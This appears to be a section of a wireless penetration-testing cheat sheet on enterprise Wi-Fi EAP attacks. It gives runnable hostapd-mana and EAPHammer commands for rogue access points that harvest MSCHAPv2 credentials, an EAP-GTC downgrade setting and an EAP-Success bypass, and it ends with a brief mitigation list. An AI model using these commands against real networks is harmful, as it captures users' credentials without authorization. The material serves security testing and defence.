# 02 — EAP Attacks

## PEAP-MSCHAPv2 Relay (hostapd-mana)

The most common EAP attack. Rogue AP relays MSCHAPv2 challenge-response to crack offline.

```bash
# Start hostapd-mana with EAP harvesting
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# Extract challenge-response
cat /var/lib/hostapd-mana/creds.txt
```

## EAPHammer

Automated Evil Twin with EAP harvesting, SSL certificate generation, and Responder integration.

```bash
./eaphammer -i wlan0 --channel 6 --auth wpa2-eap \
    --creds --mana --eap-spray \
    -e CorpWiFi --cert-wizard --auto
```

## EAP-GTC Downgrade

Force client to use weaker EAP-GTC (plaintext credentials) instead of MSCHAPv2.

```bash
# In hostapd-mana config:
eap_gtc_downgrade=1
```

## EAP-Success Attack (Legacy)

Some clients accept EAP-Success without full authentication.

```bash
# Rogue AP sends EAP-Success after identity exchange
# Bypasses authentication entirely on vulnerable clients
```

## Mitigation

- **Certificate pinning**: Pre-deploy root CA on all devices
- **EAP-TLS only**: Certificate-based, no password exposure
- **Walled garden**: Captive portal for certificate provisioning
- **Network visibility**: Alert on duplicate SSIDs/BSSIDs
